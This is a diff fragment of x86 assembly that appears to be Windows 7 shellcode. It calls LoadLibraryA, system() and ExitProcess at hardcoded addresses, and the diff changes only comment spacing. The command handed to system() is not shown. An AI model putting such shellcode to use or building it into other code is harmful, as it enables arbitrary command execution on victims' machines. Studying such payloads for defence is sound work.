@@ -19,11 +19,11 @@ global _start
 
 _start:
 			
-mov ebx, 0x777fde35      			;Address of function LoadLibraryA (win7)
+mov ebx, 0x777fde35      		;Address of function LoadLibraryA (win7)
 
 call ebx
 
-mov ebp, eax             			;msvcrt.dll is saved in ebp
+mov ebp, eax             		;msvcrt.dll is saved in ebp
 
 xor eax, eax
 
@@ -55,7 +55,7 @@ MOV EDI,ESP
 
 PUSH EDI
 
-MOV EAX, 0x768db177				;calling the system()
+MOV EAX, 0x768db177			;calling the system()
 
 CALL EAX
 
@@ -63,7 +63,7 @@ xor eax, eax
 
 push eax
 
-mov eax, 0x7780be5a     			; ExitProcess
+mov eax, 0x7780be5a     		; ExitProcess
 
 call eax
 
